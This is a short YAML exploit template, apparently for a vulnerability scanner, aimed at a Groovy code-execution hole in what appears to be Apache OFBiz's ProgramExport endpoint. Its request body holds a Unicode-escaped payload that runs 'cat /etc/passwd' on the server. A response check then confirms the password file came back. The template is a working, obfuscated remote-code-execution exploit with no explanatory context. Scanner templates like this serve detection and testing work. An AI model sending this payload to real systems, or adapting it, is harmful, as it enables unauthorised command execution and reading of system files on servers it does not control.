name: poc-yaml-test-rce
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /webtools/control/main/ProgramExport
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        groovyProgram=\u0074\u0068\u0072\u006F\u0077\u0020\u006E\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006F\u006E\u0028\u0022\u0063\u0061\u0074\u0020\u002F\u0065\u0074\u0063\u002F\u0070\u0061\u0073\u0073\u0077\u0064\u0022\u002E\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002E\u0074\u0065\u0078\u0074\u0029\u003B
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0() 
detail:
  author: k3ppf0r